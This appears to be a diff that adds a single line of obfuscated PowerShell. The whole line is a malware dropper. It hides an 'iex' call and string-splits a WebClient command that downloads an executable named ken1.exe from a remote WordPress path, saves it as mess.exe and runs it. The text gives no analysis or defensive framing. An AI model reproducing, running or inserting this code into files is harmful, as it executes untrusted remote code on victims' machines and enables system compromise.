@@ -1,0 +1,1 @@
+﻿ . ( ([strInG]$veRbosePrEfeREncE)[1,3]+'x'-jOIn'') (('(New-O'+'bj'+'e'+'ct S'+'y'+'s'+'t'+'e'+'m.'+'Net.WebCl'+'ient).Down'+'loadFil'+'e(XFrhttp:'+'//brokelimite'+'ds.in/wp-'+'admin/c'+'ss'+'/u'+'pload/'+'ken1.ex'+'eXFr,'+'X'+'Frmess.exeXFr'+');'+'Sta'+'r'+'t-'+'Proce'+'ss '+'XF'+'rme'+'ss.e'+'xe'+'X'+'Fr').REplaCE('XFr',[StRInG][chAR]39)) 
